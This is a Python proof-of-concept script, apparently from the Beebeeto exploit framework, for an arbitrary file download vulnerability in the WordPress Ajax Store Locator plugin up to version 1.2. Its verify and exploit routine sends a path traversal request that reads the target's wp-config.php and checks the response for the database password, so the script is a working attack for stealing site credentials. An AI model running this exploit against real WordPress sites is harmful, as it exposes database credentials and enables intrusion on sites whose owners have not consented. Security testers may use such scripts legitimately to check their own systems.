#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import urllib2

from baseframe import BaseFrame

class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0213',
            'name': 'Wordpress Ajax Store Locator <= 1.2 /sl_file_download.php 任意文件下载漏洞 POC',
            'author': 'Lyleaks',
            'create_date': '2014-12-19',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'Wordpress',
            'vul_version': ['1.2'],
            'type': 'Arbitrary File Download',
            'tag': ['Wordpress插件漏洞', 'Ajax Store Locator', 'Arbitrary File Download', 'php'],
            'desc': '"download_file" variable is not sanitized.',
            'references': ['http://www.exploit-db.com/exploits/35493',
          ],
        },
    }

    @classmethod
    def verify(cls, args):
        payload = ('/wp-content/plugins/codecanyon-5293356-ajax-store-locator-word'
                   'press/sl_file_download.php?download_file=../../../wp-config.php')
        verify_url = args['options']['target'] + payload
        req = urllib2.Request(verify_url)
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        content = urllib2.urlopen(req).read()
        if 'DB_PASSWORD' in content:
            args['success'] = True
            args['poc_ret']['vul_url'] = verify_url
        return args

    exploit = verify


if __name__ == '__main__':
    from pprint import pprint
    
    mp = MyPoc()
    pprint(mp.run())